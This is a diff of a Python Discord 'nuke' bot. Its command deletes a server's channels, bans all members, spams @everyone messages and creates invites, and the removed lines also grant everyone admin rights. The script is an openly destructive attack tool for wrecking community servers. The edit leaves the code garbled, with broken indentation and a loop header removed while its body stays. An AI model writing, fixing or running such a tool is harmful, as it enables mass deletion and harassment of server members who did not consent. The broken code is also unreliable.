@@ -5,19 +5,18 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "UR TOKEN"
+token = "Your bot token"
 
 
-SPAM_CHANNEL =  ["UR MESSAGE FOR THE CHANNELS"]
-SPAM_MESSAGE = ["@everyone UR MESSAGE FOR THE SPAM MESSAGE"]
+SPAM_CHANNEL =  ["Spam channel message"]
+SPAM_MESSAGE = ["@everyone Spam in chat message"]
 
-client = commands.Bot(command_prefix="UR PREFIX")
+client = commands.Bot(command_prefix="Change your prefix example: ! or .")
 
 
 @client.event
 async def on_ready():
    print(''' 
-
    
 
   /$$$$$$                        /$$     /$$
@@ -28,32 +27,21 @@ async def on_ready():
  /$$  \ $$| $$_____/| $$  | $$  | $$ /$$| $$
 |  $$$$$$/|  $$$$$$$| $$  | $$  |  $$$$/| $$
  \______/  \_______/|__/  |__/   \___/  |__/
-                                            
-                                            
-                                            
- 
-
- Please type .Nuke in the discord chat to begin 
  ''')
 
 @client.command()
-async def Nuke (ctx):
+async def nuke (ctx):
     await ctx.message.delete()
     guild = ctx.guild
-   role = discord.utils.get(guild.roles, name = "@everyone")
-      await role.edit(permissions = Permissions.all())
-      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
-    except:
-      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
-    for channel in guild.channels:
+    try:
       try:
         await channel.delete()
         print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
-    for member in guild.members:
-     try:
-       await member.ban()
+      for member in guild.members:
+        try:
+         await member.ban()
        print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
@@ -73,12 +61,10 @@ async def Nuke (ctx):
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
-        await user.unban("Sentimental#6666")
+        await user.unban("𝐘𝐨𝐮𝐫_𝐔𝐬𝐞𝐫")
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("Senti Says it begins")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
